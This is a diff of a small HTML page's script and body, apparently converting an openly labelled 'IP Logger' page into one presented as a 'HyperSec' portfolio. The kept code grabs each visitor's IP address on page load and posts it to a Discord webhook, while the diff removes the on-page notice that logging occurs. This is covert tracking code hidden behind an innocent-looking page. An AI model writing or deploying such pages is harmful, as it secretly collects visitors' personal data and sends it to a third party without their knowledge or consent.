@@ -10,31 +10,14 @@
       $.get("https://api.ipify.org?format=json", function(data) {
         var ip = data.ip;
         
-        // Fetch IP information
-        $.get("https://ipapi.co/" + ip + "/json/", function(info) {
-          var country = info.country_name;
-          var city = info.city;
-          
-          // Create Discord embed
-          var embed = {
-            title: "IP Logger",
-            description: "IP Logged: " + ip,
-            fields: [
-              { name: "Country", value: country },
-              { name: "City", value: city }
-            ],
-            color: 16711680 // Red color, you can change it
-          };
-          
-          // Send embed to Discord webhook
-          $.post(webhookUrl, { embeds: [embed] });
-        });
+        // Send IP to Discord webhook
+        $.post(webhookUrl, { content: "IP Logged: " + ip });
       });
     });
   </script>
 </head>
 <body>
-  <h1>IP Logger</h1>
-  <p>Your IP address, along with the country and city information, has been logged and sent to a Discord webhook.</p>
+  <h1>HyperSec</h1>
+  <p>My portfolio</p>
 </body>
 </html>
